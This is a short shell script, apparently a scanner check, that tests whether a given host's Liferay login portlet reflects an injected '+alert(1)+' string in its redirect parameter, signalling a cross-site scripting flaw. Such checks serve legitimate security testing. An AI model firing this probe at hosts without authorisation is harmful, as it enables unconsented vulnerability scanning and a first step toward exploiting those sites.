exitValue=1

VAR="$(curl -s -L -m 3 "http://$1/api//axis" --data-urlencode "p_p_id=com_liferay_login_web_portlet_LoginPortlet" --data-urlencode "p_p_state=maximized" --data-urlencode "_com_liferay_login_web_portlet_LoginPortlet_redirect='+alert(1)+'")"

if echo "$VAR" | grep -q '+alert(1)+'; then
    exitValue=0
fi

exit $exitValue